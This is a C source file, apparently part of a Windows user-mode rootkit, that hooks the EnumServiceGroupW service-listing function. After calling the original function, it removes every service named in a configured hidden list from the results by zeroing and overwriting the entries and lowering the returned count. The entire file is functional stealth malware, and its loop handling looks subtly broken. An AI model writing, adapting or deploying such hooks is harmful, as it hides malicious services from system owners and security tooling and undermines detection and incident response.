#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include "ntdll.h"

#include "config.h"

#include "enumservicegroupw.h"

// advapi32.EnumServiceGroupW
BOOL WINAPI NewEnumServiceGroupW(
		SC_HANDLE hSCManager,
		DWORD dwServiceType,
		DWORD dwServiceState,
		LPBYTE lpServices,
		DWORD cbBufSize,
		LPDWORD pcbBytesNeeded,
		LPDWORD lpServicesReturned,
		LPDWORD lpResumeHandle,
		DWORD dwUnknown
)
{
	BOOL b;
	
	// call original function
	b=OldEnumServiceGroupW(
			hSCManager,
			dwServiceType,
			dwServiceState,
			lpServices,
			cbBufSize,
			pcbBytesNeeded,
			lpServicesReturned,
			lpResumeHandle,
			dwUnknown
			);

	if (b || GetLastError()==ERROR_MORE_DATA)
	{
		DWORD dwNrOfSvc,dwCount;
		ENUM_SERVICE_STATUSW* pEnum=(ENUM_SERVICE_STATUSW*)lpServices;
		UNICODE_STRING usSvcName;
		ANSI_STRING asSvcName;
		
		lpResumeHandle=NULL;
		dwNrOfSvc=*lpServicesReturned;
		for (dwCount=0;dwCount<dwNrOfSvc;dwCount++)
		{
			RtlInitUnicodeString(&usSvcName,pEnum->lpServiceName);
			if (NT_SUCCESS(RtlUnicodeStringToAnsiString(&asSvcName,&usSvcName,TRUE)))
			{
				if (config_CheckString(ConfigHiddenService,asSvcName.Buffer,asSvcName.Length))
				{
					RtlZeroMemory(pEnum->lpDisplayName,wcslen(pEnum->lpDisplayName));
					RtlZeroMemory(pEnum->lpServiceName,wcslen(pEnum->lpServiceName));
					RtlCopyMemory((char*)pEnum,(char*)pEnum+sizeof(ENUM_SERVICE_STATUSW),sizeof(ENUM_SERVICE_STATUSW)*(dwNrOfSvc-(dwCount+1))); // hide handle
        			RtlZeroMemory((char*)pEnum+sizeof(ENUM_SERVICE_STATUSW)*(dwNrOfSvc-(dwCount+1)),sizeof(ENUM_SERVICE_STATUSW)); // delete last row
        			(*lpServicesReturned)--; // change number of services
				}
				else
					pEnum++;
				
				RtlFreeAnsiString(&asSvcName);
			}
			else
				pEnum++;
		}
	}

	return b;
}